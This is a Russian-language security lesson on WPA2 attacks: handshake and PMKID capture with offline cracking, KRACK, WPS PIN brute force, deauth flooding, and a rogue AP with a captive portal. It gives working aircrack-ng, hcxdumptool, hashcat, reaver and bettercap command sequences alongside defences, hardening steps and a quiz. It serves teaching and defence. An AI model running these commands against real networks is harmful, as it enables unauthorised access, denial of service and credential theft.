---
id: network-wpa2-attacks
title: "WPA2-атаки: PMKID, KRACK, WPS и deauth"
category: network
parent: network-module-wireless
difficulty: hard
order: 1
tags: [network, wifi, wpa2, pmkid, krack, wps, deauth, handshake]
prerequisites: [network-module-wireless, network-wireless-80211]
useful_for:
  - "CTF Network (Wi-Fi-задачи)"
  - "Пентест: взлом Wi-Fi, rogue AP"
  - "Работа (SOC): детект Wi-Fi-атак"
estimated_minutes: 55
summary: "Атаки на WPA2: перехват 4-way handshake, PMKID без клиента, KRACK, WPS-брутфорс и deauth — с командами aircrack-ng/hcxdumptool и разбором защиты."
---

WPA2-PSK остаётся самым распространённым режимом Wi-Fi, и его безопасность зависит от одного пароля. Атаки на WPA2 — классика пентеста: собрать handshake (или PMKID), перебрать офлайн, использовать WPS или разорвать соединения. Урок продолжает [`network-module-wireless`](network-module-wireless) и опирается на [`network-wireless-80211`](network-wireless-80211).

## 4-way handshake: что перехватываем

При подключении клиента к точке доступа происходит 4-way handshake (EAPOL): AP и клиент доказывают знание PMK, не передавая пароль. Перехватив handshake, можно **офлайн** перебрать пароль.

```bash
# 1. Режим монитора
sudo airmon-ng start wlan0
# 2. Найти сеть и канал
sudo airodump-ng wlan0mon
# 3. Захватить handshake на нужном канале
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
# 4. Подтолкнуть клиента (deauth) — ускоряет захват
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# 5. Перебрать
aircrack-ng cap-01.cap -w rockyou.txt
```

## PMKID: без клиента

**PMKID** вычисляется из PMK, MAC AP и MAC клиента. Некоторые AP отдают PMKID в первом кадре EAPOL, поэтому handshake клиента не нужен — достаточно одного кадра от AP.

```bash
# hcxdumptool: собрать PMKID
sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
# Конвертировать в hashcat
hcxpcapngtool -o hash.hc22000 dump.pcapng
# Перебрать (hashcat mode 22000)
hashcat -m 22000 hash.hc22000 rockyou.txt
```

PMKID-атака не шумит (не нужен deauth) и работает «пассивно» — но зависит от того, отдаёт ли AP PMKID.

## KRACK

**KRACK** (Key Reinstallation Attack) эксплуатирует повторную установку ключа в 4-way handshake: атакующий заставляет переустановить уже использованный nonce, что позволяет расшифровать/подменить часть трафика. Патчится обновлением и не связан с паролем.

```bash
# Демонстрация KRACK (только в лаборатории, krackattacks-scripts)
# ./krack-test-client.py
```

KRACK — уязвимость реализации, поэтому защита — обновление прошивок клиентов и AP.

## WPS: пин-брутфорс

**WPS** (Wi-Fi Protected Setup) позволяет подключиться по 8-значному PIN. PIN проверяется по частям, что сокращает пространство перебора до ~11000 комбинаций. Многие AP блокируют WPS после неудач (lockout), но не все.

```bash
# Сканировать WPS
sudo wash -i wlan0mon
# Брутфорс PIN
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
# Или bully
sudo bully -b AA:BB:CC:DD:EE:FF wlan0mon
```

## Deauth/disassoc

**Deauth**-кадры (management) разрывают соединение клиента. Они не аутентифицированы (до 802.11w/PMF), поэтому атакующий может:

- заставить клиента переподключиться (сбор handshake);
- устроить DoS;
- подтолкнуть к подключению к evil twin.

```bash
# Deauth одного клиента
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# Deauth broadcast (все клиенты)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**802.11w (PMF)** защищает management-кадры от подделки — это правильная защита от deauth.

## Практика: полный цикл взлома WPA2

```bash
# 1. Монитор и обнаружение
sudo airmon-ng start wlan0; sudo airodump-ng wlan0mon
# 2. Захват handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon &
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# 3. Проверить, что handshake есть
aircrack-ng cap-01.cap
# 4. Перебрать словарём / маской
aircrack-ng cap-01.cap -w words.txt
hashcat -m 22000 cap.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

## Инструменты

| Инструмент | Назначение |
|---|---|
| `aircrack-ng` | захват, deauth, перебор |
| `hcxdumptool`/`hcxtools` | PMKID, конвертация |
| `hashcat -m 22000` | перебор WPA2 |
| `reaver`/`bully` | WPS-брутфорс |
| `bettercap` | rogue AP, MITM |

## Защита

| Мера | Против чего |
|---|---|
| Сильный пароль + WPA3 | офлайн-перебор |
| Отключить WPS | пин-брутфорс |
| 802.11w (PMF) | deauth |
| Обновление прошивок | KRACK |
| Мониторинг deauth/rogue | детект |
| 802.1X/EAP вместо PSK | кража пароля |

## Частые ошибки

- **Слабый пароль** — перебор за минуты.
- **Оставлять WPS** — пин-брутфорс.
- **Без PMF** — deauth-атаки.
- **Не обновлять прошивки** — KRACK и другие.
- **Игнорировать PMKID** — «пассивный» перебор.
- **Считать deauth «просто шумом»** — это подготовка атаки.
- **Не логировать ассоциации** — rogue AP невидим.

## Что дальше / решение

После WPA2 переходите к [`network-wpa3`](network-wpa3) (SAE и downgrade) и [`network-evil-twin`](network-evil-twin). Для IoT-радио — [`network-zigbee-zwave`](network-zigbee-zwave).

## Практика: PMKID end-to-end

```bash
# 1. Монитор-режим
sudo airmon-ng start wlan0
# 2. Собрать PMKID (без deauth)
sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
# 3. Конвертировать в hashcat-формат
hcxpcapngtool -o hash.hc22000 dump.pcapng
# 4. Перебрать
hashcat -m 22000 hash.hc22000 words.txt
# 5. Или маской (8 цифр)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

PMKID-путь не требует клиента и не шумит deauth — но работает только если AP отдаёт PMKID.

## Сравнение атак на WPA2

| Атака | Нужен клиент | Шум | Уязвимость |
|---|---|---|---|
| 4-way handshake | да | deauth | слабый пароль |
| PMKID | нет | нет | AP отдаёт PMKID |
| KRACK | да | низкий | реализация |
| WPS PIN | нет | средний | WPS включён |
| Evil twin | нет | средний | доверие клиента |

## Чек-лист Wi-Fi-безопасности

1. Используется ли **WPA3** или WPA2 с сильным паролем?
2. Отключён ли **WPS**?
3. Включён ли **802.11w (PMF)**?
4. Обновлены ли прошивки (**KRACK**)?
5. Мониторятся ли **deauth** и **rogue AP**?
6. Сегментирован ли **гостевой** доступ?
7. Используется ли **802.1X** для корпоративных устройств?

```bash
# Снимок
sudo airodump-ng wlan0mon | head -30
sudo wash -i wlan0mon    # WPS-устройства
```

Вывод: пароль — главный фактор для PSK-сетей; WPS и отсутствие PMF добавляют векторы. Для корпоративных сетей предпочтителен 802.1X с индивидуальными credentials, а не общий PSK.

## Харденинг Wi-Fi

```text
# Точка доступа: WPA3/переходный режим, PMF обязателен
# (примерные настройки, зависят от вендора)
security wpa3 transition
pmf required
wps disable
# Для корпоративных сетей — 802.1X
dot1x system-auth-control
```

Чек-лист усиления:

1. **WPA3** (или WPA2-AES с длинным паролем) — нет TKIP/WEP.
2. **PMF обязателен** — блокирует deauth.
3. **WPS выключен** — нет пин-брутфорса.
4. **Прошивки обновлены** — нет KRACK.
5. **802.1X** для сотрудников, гостевой — изолирован.
6. **Мониторинг** rogue/deauth (WIPS).
7. **Ротация** паролей/сертификатов.

```bash
# Проверить, какие шифры предлагает AP
tshark -r wifi.pcap -Y 'wlan.rsn' -T fields -e wlan.rsn.pcs.type | sort -u
```

## Итог по WPA2

WPA2 держится на пароле. Если пароль слаб — его переберут офлайн из handshake или PMKID. WPS и отсутствие PMF добавляют независимые векторы. Правильная защита — WPA3/сильный пароль, PMF, отключённый WPS и мониторинг эфира. Для корпоративного сегмента — 802.1X с индивидуальными credentials.

## Дополнительно: rogue AP и MITM

Wi-Fi-атаки редко идут в одиночку. Типичная цепочка:

1. **Сканирование** эфира и выбор цели.
2. **Deauth** клиента (если нет PMF).
3. **Evil twin** — поднять копию SSID.
4. **Captive portal** — собрать credentials.
5. **MITM** — перехват после подключения.

```bash
# bettercap: rogue AP + captive portal (лаборатория)
sudo bettercap -iface wlan0
# > wifi.recon on
# > wifi.show
# > set wifi.ap.ssid "FreeWiFi"; wifi.ap on
```

Подробности — в [`network-evil-twin`](network-evil-twin) и [`network-mitm`](network-mitm). Защита: PMF, 802.1X, обучение пользователей и мониторинг rogue AP.

## Итог

Wi-Fi-безопасность — это комбинация: криптография (WPA3/PMF), гигиена (WPS off, обновления), архитектура (802.1X, сегментация) и мониторинг (WIPS). Пропуск любого слоя открывает конкретный вектор: без PMF — deauth, без WPS-off — пин-брутфорс, слабый пароль — офлайн-перебор.

## Квиз

```quiz
- question: "Что нужно для офлайн-перебора WPA2-PSK?"
  options:
    - "4-way handshake или PMKID"
    - "Сертификат AP"
    - "MAC-адрес клиента"
    - "IP точки доступа"
  answer: 0
  explanation: "Handshake/PMKID содержит материал для проверки пароля офлайн."
- question: "Чем удобен PMKID-подход?"
  options:
    - "Не нужен клиент и deauth — хватает кадра от AP"
    - "Он быстрее перебирает"
    - "Он даёт пароль сразу"
    - "Он работает по Bluetooth"
  answer: 0
  explanation: "PMKID отдают некоторые AP в первом EAPOL-кадре."
- question: "Что эксплуатирует KRACK?"
  options:
    - "Повторную установку ключа в 4-way handshake"
    - "Слабый пароль"
    - "WPS PIN"
    - "Открытый порт"
  answer: 0
  explanation: "KRACK — уязвимость реализации переустановки ключа."
- question: "Почему WPS-пин легко перебрать?"
  options:
    - "PIN проверяется по частям (сокращённое пространство)"
    - "Он только 2 цифры"
    - "Он передаётся открыто"
    - "Он меняется редко"
  answer: 0
  explanation: "Поэтапная проверка PIN сокращает перебор до ~11k."
- question: "Какая защита мешает deauth-атакам?"
  options:
    - "802.11w (PMF)"
    - "WPS"
    - "WEP"
    - "Открытая сеть"
  answer: 0
  explanation: "PMF защищает management-кадры от подделки."
```

## Где пригодится

- **CTF:** задачи с Wi-Fi-handshake и PMKID.
- **Пентест:** взлом Wi-Fi, rogue AP, оценка паролей.
- **SOC:** детект deauth, rogue AP, WPS-брутфорса.
- **Инженерия:** WPA3, PMF, отключение WPS.
